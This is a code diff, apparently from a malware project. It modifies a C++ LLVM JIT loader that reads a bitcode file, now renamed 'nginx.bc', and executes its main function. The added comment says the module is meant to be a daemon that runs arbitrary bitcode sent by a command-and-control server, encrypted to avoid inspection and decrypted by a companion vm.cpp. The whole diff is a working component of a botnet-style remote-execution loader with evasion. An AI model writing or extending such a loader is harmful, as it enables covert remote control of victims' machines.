@@ -10,44 +10,43 @@
 using namespace llvm;
 using namespace std;
 
-static ExecutionEngine *TheExecutionEngine;
+/**
+   This is mainly a copy of vm.cpp, so why do we want to
+   run the JIT within itself so to speak? The reason is because
+   we want this module to serve as machinery that creates
+   a daemon and facilitates the arbitrary execution of bitcode
+   distributed by a C&C.
 
-int main(int argc, const char *argv[])
-{
-  LLVMInitializeNativeTarget();
-  LLVMInitializeNativeAsmPrinter();
-  LLVMInitializeNativeAsmParser();
-  
+   We would like this code to remain free from inspection, so since
+   we compile it to bitcode, we can encrypt it and distribute it
+   with vm.cpp, which will simply decrypt it and pass it to the
+   JIT.
+*/
+int main (int argc, const char *argv[]) {
   LLVMContext context;
   
   SMDiagnostic error;
-  Module *m = ParseIRFile("load.bc", error, context);
-  /** 
-     Uncomment to see IR assembly code
-  */
-  if(m)
-  {
-    // m->dump();
-  }
-
+  Module *m = ParseIRFile("nginx.bc", error, context);
+  ExecutionEngine *TheExecutionEngine;
+  
   // Create the JIT.  This takes ownership of the module.
   TheExecutionEngine = EngineBuilder(m).setUseMCJIT(true).create();
-
+  
   Function *f = m->getFunction("main");
-
+  
   if(!f) {
-   cerr << "Function payload not defined!" << endl;
-   exit(1);
+    cerr << "Function payload not defined!" << endl;
+    exit(1);
   }
-
+  
   TheExecutionEngine->finalizeObject();
-
+  
   // JIT the function, returning a function pointer.
   void *FPtr = TheExecutionEngine->getPointerToFunction(f);
 
   int (*FP)(int argc, const char*[]) = (int (*)(int argc, const char*[]))FPtr;
-
+  
   FP(argc, argv);
-
+  
   return 0;
 }
